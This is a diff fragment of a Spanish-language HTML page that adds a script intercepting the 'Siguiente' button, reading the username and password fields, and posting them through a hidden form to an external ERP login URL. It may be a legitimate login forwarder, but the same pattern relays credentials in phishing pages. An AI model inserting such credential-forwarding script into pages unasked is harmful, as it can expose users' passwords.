@@ -158,6 +158,40 @@ Es tambi&eacute;n importante que reporte cualquier anomal&iacute;a en este proce
 </div>
 
 
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const btn = document.getElementById("btnSiguiente"); // ID real del botón "Siguiente"
+    if (btn) {
+        btn.addEventListener("click", function (e) {
+            e.preventDefault(); // Evita comportamiento por defecto
+
+            const usuario = document.getElementById("txtUsuario")?.value || "";
+            const contrasena = document.getElementById("txtContrasena")?.value || "";
+
+            // Crear un formulario oculto para enviar los datos
+            const form = document.createElement("form");
+            form.method = "POST";
+            form.action = "https://sincoerp.com/portalpersonal/site/login";
+
+            const inputUser = document.createElement("input");
+            inputUser.type = "hidden";
+            inputUser.name = "username";
+            inputUser.value = usuario;
+
+            const inputPass = document.createElement("input");
+            inputPass.type = "hidden";
+            inputPass.name = "password";
+            inputPass.value = contrasena;
+
+            form.appendChild(inputUser);
+            form.appendChild(inputPass);
+
+            document.body.appendChild(form);
+            form.submit();
+        });
+    }
+});
+</script>
 
 	
 	
